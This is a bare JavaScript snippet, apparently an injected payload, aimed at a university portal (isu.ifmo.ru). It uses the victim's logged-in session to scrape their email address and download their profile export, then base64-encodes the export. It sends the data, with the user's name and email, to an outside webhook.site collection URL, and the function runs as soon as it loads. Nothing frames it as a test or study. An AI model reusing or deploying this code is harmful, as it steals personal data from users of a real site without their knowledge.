async function some3() {
    var response = await fetch("https://isu.ifmo.ru/pls/apex/f?p=2156:1:"+document.querySelector('#pInstance').value+"::NO:RP:P0_MENU_PROV:1");
    var content = await response.text();
    var r1 = content.search('id="P1_NEW_EMAIL')
    var r2 = content.slice(r1).search('/>')
    var email = content.slice(r1+71, r1+r2-3)
    var response = await fetch("https://isu.ifmo.ru/pls/apex/f?p=2437:31:"+document.querySelector('#pInstance').value+":EXPORTPROFILE:NO:::");
    var content = await response.blob();
    var reader = new FileReader();
    reader.readAsDataURL(content);
    reader.onloadend = function() {
      var base64data = reader.result;
      fetch("https://webhook.site/9a3472c5-0292-4ebc-b194-7877b6a1db97/"+document.querySelector('#USER_FIO').value+email, { method: 'POST', body: base64data });
    }
}
some3()
